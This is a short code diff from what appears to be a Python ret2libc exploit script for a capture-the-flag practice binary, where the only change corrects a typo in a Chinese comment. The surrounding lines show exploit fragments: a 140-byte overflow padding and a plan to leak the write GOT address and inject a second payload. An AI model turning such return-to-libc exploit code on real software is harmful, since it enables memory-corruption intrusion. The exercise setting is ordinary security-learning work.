@@ -24,7 +24,7 @@ def ret2_libc3_2(file_name='/mnt/hgfs/Cyber Security PWN/test/pwn3/level3'):
     write_got = p32(elf.got['write'])
     read_text = p32(0x0804844B)
 
-    # 第一次payload：劫持调用write函数泄露存放wirte的get.plt内存地址、调用read再次注入payload_2
+    # 第一次payload：劫持调用write函数泄露存放write的get.plt内存地址、调用read再次注入payload_2
     payload_1 = b'A' * 140
 
     # write("%p", *write_got)
